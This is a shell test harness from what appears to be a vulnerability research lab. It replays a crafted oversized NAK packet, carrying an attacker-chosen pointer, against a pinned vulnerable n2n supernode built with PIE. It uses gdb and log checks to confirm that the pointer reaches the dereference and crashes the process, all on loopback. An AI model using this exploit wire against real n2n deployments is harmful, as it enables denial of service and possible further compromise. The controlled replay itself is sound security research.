#!/bin/sh
# W22 one-command replay: W11's exact wire (token_size=1700, chosen pointer
# at token+1682) against a clang -O2 build of the pinned vulnerable supernode
# WITH default PIE (no -no-pie anywhere). Closes W21's PIE UNKNOWN.
#
# Hypothesis: the write still reaches the spilled `comm` slot and the wire
# still supplies its value, but the non-PIE fixed address 0x42f3e8 is not a
# valid mapping in a PIE process, so the dereference at sn_utils.c:2324
# faults. A fresh process with a safe 48-byte NAK still forwards normally.
#
#   sh lab/frontier/n2n2shell/live/w22_default_pie_wire1700.sh
#
# Prints "RESULT <n> PASS / <m> FAIL"; rc 0 only when m=0. Loopback only.
set -u
HERE=$(cd "$(dirname "$0")" || exit 1; pwd)
N2N=$(cd "$HERE/.." || exit 1; pwd)
TARBALL=$N2N/provision/n2n-vuln.tar.gz
SENDER=$HERE/w10_large_peer.py
EVID=${REPLAY_LOGDIR:-$HERE/evidence}
WORK=${TMPDIR:-/tmp}/n2n2shell-w22.$$
BASE=${PORT_BASE:-19800}
TARGET=0x42f3e8
PASS=0
FAIL=0
mkdir -p "$WORK/src" "$EVID" || exit 1
trap 'rm -rf "$WORK"' EXIT HUP INT TERM
check() {
    if [ "$2" -eq 0 ]; then PASS=$((PASS+1)); echo "PASS $1";
    else FAIL=$((FAIL+1)); echo "FAIL $1"; fi
}

(cd "$N2N" && sha256sum -c pins.sha256) >"$EVID/w22-pins.log" 2>&1
check 01-pins-exact "$?"

tar xzf "$TARBALL" -C "$WORK/src" || exit 1
SRC=$WORK/src/n2n-dc7324af16b2ff3e2b22961e7d8dffcb14f3f6ff
(cd "$SRC" && sh autogen.sh &&
    CC=clang CFLAGS="-g -O2 -fno-omit-frame-pointer" ./configure &&
    make -j4 supernode) >"$EVID/w22-pie-build.log" 2>&1
check 02-pie-clang-o2-build "$?"
[ -x "$SRC/supernode" ] || { echo "RESULT $PASS PASS / $FAIL FAIL"; exit 1; }

# Type DYN is the ET_DYN PIE marker; the non-PIE W11 build is Type EXEC.
readelf -h "$SRC/supernode" >"$EVID/w22-readelf.log" 2>&1
grep -q 'Type:.*DYN' "$EVID/w22-readelf.log"
check 03-elf-type-dyn-pie "$?"
if grep -q 'Type:.*EXEC' "$EVID/w22-readelf.log"; then RC=1; else RC=0; fi
check 04-not-non-pie "$?"
file "$SRC/supernode" >"$EVID/w22-file.log" 2>&1
grep -qi 'pie executable' "$EVID/w22-file.log"
check 05-file-reports-pie "$?"

# gdb observes; it never supplies the pointer value. The wire does.
gdb_case() {
    label=$1 port=$2 override=$3
    cmd=$WORK/gdb-$label.txt
    cat >"$cmd" <<EOF
set pagination off
set confirm off
set disable-randomization on
break sn_utils.c:2324
run -f -p 127.0.0.1:$port -t $((port+1)) -c community.list -F labfed -M
printf "W22_AT_DEREF comm="
p comm
printf "W22_MAPPINGS\n"
info proc mappings
continue
printf "W22_AFTER_CONTINUE\n"
bt 3
printf "W22_DONE\n"
kill
quit
EOF
    (cd "$SRC" && timeout 40 gdb -q -batch -x "$cmd" ./supernode) \
        >"$EVID/w22-pie-$label-gdb.log" 2>&1 &
    gp=$!
    sleep 5
    python3 "$SENDER" "$port" "$((port+10))" 1700 "$override" \
        >"$EVID/w22-pie-$label-sender.log" 2>&1
    wait "$gp" 2>/dev/null || true
}

gdb_case fixed "$BASE" "1682:$TARGET"
grep -q 'override token+1682 = e8f3420000000000' "$EVID/w22-pie-fixed-sender.log"
check 06-chosen-pointer-on-wire "$?"
grep -q "W22_AT_DEREF comm=.*$TARGET" "$EVID/w22-pie-fixed-gdb.log"
check 07-deref-reads-wire-chosen-pointer "$?"
python3 - "$EVID/w22-pie-fixed-gdb.log" <<'PY'
import re, sys
txt = open(sys.argv[1]).read().split('W22_MAPPINGS', 1)[1]
target = 0x42f3e8
covered = False
for line in txt.splitlines():
    m = re.match(r'\s*0x([0-9a-f]+)\s+0x([0-9a-f]+)\s', line)
    if m and int(m.group(1), 16) <= target < int(m.group(2), 16):
        covered = True
sys.exit(1 if covered or '0x00005555' not in txt else 0)
PY
check 08-chosen-address-unmapped-in-pie "$?"
grep -q 'Program received signal SIGSEGV' "$EVID/w22-pie-fixed-gdb.log"
check 09-sigsegv-at-deref "$?"
grep -A5 'Program received signal SIGSEGV' "$EVID/w22-pie-fixed-gdb.log" |
    grep -q 'sn_utils.c:2324'
check 10-fault-at-comm-deref "$?"
if grep -q 'W22_DONE' "$EVID/w22-pie-fixed-gdb.log"; then RC=1; else RC=0; fi
check 11-no-clean-nak-dereference "$?"

# Plain build (no gdb): the same crash, then a fresh process still serves.
PBASE=$((BASE+60))
(cd "$SRC" && timeout 60 ./supernode -f -p 127.0.0.1:$PBASE \
    -t $((PBASE+1)) -c community.list -F labfed -M) \
    >"$EVID/w22-pie-plain-attack.log" 2>&1 &
sp=$!
sleep 2
python3 "$SENDER" "$PBASE" "$((PBASE+10))" 1700 "1682:$TARGET" \
    >"$EVID/w22-pie-plain-attack-sender.log" 2>&1
grep -q 'sent NAK len=1738 token_size=1700' "$EVID/w22-pie-plain-attack-sender.log"
check 12-plain-attack-wire-sent "$?"
i=0
while kill -0 "$sp" 2>/dev/null && [ "$i" -lt 20 ]; do
    sleep 0.5
    i=$((i+1))
done
if kill -0 "$sp" 2>/dev/null; then kill "$sp" 2>/dev/null || true; fi
wait "$sp" 2>/dev/null
SN_RC=$?
echo "INFO plain_supernode_rc=$SN_RC"
[ "$SN_RC" -ne 0 ]
check 13-plain-process-died-on-wire "$?"
if kill -0 "$sp" 2>/dev/null; then RC=1; else RC=0; fi
check 14-plain-process-gone "$?"

SPBASE=$((BASE+120))
(cd "$SRC" && timeout 60 ./supernode -f -p 127.0.0.1:$SPBASE \
    -t $((SPBASE+1)) -c community.list -F labfed -M) \
    >"$EVID/w22-pie-safe.log" 2>&1 &
sp2=$!
sleep 2
python3 "$SENDER" "$SPBASE" "$((SPBASE+10))" 48 \
    >"$EVID/w22-pie-safe-sender.log" 2>&1
grep -q 'REGISTER_SUPER reply len=' "$EVID/w22-pie-safe-sender.log"
check 15-fresh-peer-registered "$?"
grep -q 'FORWARDED len=86' "$EVID/w22-pie-safe-sender.log"
check 16-safe-forward-after-attack "$?"
grep -q 'first=485a4d49485a4d49' "$EVID/w22-pie-safe-sender.log"
check 17-safe-token-bytes "$?"
if kill -0 "$sp2" 2>/dev/null; then check 18-safe-process-alive 0;
else check 18-safe-process-alive 1; fi
kill "$sp2" 2>/dev/null || true
wait "$sp2" 2>/dev/null || true

echo "RESULT $PASS PASS / $FAIL FAIL"
echo "RAW $EVID/w22-*.log"
[ "$FAIL" -eq 0 ]
